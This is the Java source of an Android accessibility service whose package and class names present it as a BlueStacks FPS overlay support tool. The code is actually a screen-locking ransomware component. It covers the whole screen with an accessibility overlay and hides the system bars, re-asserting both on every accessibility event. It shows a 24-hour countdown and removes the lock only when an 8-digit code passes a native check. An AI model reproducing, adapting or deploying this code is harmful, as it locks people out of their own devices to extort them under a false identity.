package com.bluestacks.fpsoverlay;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Button;
import android.widget.TextView;
import java.util.Locale;

public class SupportService extends AccessibilityService {
    private WindowManager wm;
    private View overlay;
    private TextView tv_status;
    private TextView tv_display;
    private StringBuilder input_buffer = new StringBuilder();
    private long remaining_sec = 86400; // 24h
    private Handler task_handler = new Handler(Looper.getMainLooper());

    public native boolean checkKey(String s);
    public native boolean checkStatus();

    static {
        System.loadLibrary("fps-native");
    }

    private final Runnable ticker = new Runnable() {
        @Override
        public void run() {
            if (remaining_sec > 0) {
                remaining_sec--;
                update_timer();
                task_handler.postDelayed(this, 1000);
            }
        }
    };

    private void update_timer() {
        if (tv_status != null) {
            long h = remaining_sec / 3600;
            long m = (remaining_sec % 3600) / 60;
            long s = remaining_sec % 60;
            tv_status.setText(String.format(Locale.getDefault(), "%02d:%02d:%02d", h, m, s));
        }
    }

    @Override
    protected void onServiceConnected() {
        if (checkStatus()) {
            disableSelf();
            return;
        }
        setup_layout();
        task_handler.post(ticker);
    }

    private void apply_immersive_mode() {
        if (overlay != null) {
            overlay.setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
                View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_FULLSCREEN |
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            );
        }
    }

    private void setup_layout() {
        wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        LayoutInflater inflater = LayoutInflater.from(this);
        overlay = inflater.inflate(R.layout.sys_opt_view, null);

        WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
        lp.format = PixelFormat.TRANSLUCENT;
        
        lp.flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                   WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                   WindowManager.LayoutParams.FLAG_FULLSCREEN |
                   WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS |
                   WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
            lp.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
        }

        lp.width = WindowManager.LayoutParams.MATCH_PARENT;
        lp.height = WindowManager.LayoutParams.MATCH_PARENT;
        lp.gravity = Gravity.TOP | Gravity.START;

        apply_immersive_mode();
        overlay.setOnSystemUiVisibilityChangeListener(visibility -> apply_immersive_mode());

        tv_status = overlay.findViewById(R.id.v_timer);
        tv_display = overlay.findViewById(R.id.v_display);
        
        int[] ids = {R.id.v_b0, R.id.v_b1, R.id.v_b2, R.id.v_b3, R.id.v_b4, 
                     R.id.v_b5, R.id.v_b6, R.id.v_b7, R.id.v_b8, R.id.v_b9};
        
        for (int id : ids) {
            overlay.findViewById(id).setOnClickListener(v -> {
                if (input_buffer.length() < 8) {
                    input_buffer.append(((Button)v).getText().toString());
                    refresh_display();
                }
            });
        }

        overlay.findViewById(R.id.v_del).setOnClickListener(v -> {
            if (input_buffer.length() > 0) {
                input_buffer.setLength(input_buffer.length() - 1);
                refresh_display();
            }
        });

        overlay.findViewById(R.id.v_ok).setOnClickListener(v -> {
            if (checkKey(input_buffer.toString())) {
                wm.removeView(overlay);
                disableSelf();
            } else {
                input_buffer.setLength(0);
                refresh_display();
            }
        });

        wm.addView(overlay, lp);
    }

    private void refresh_display() {
        if (tv_display != null) {
            tv_display.setText(input_buffer.toString());
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!checkStatus() && overlay != null) {
            apply_immersive_mode();
            wm.updateViewLayout(overlay, overlay.getLayoutParams());
        }
    }

    @Override
    public void onInterrupt() {}
}
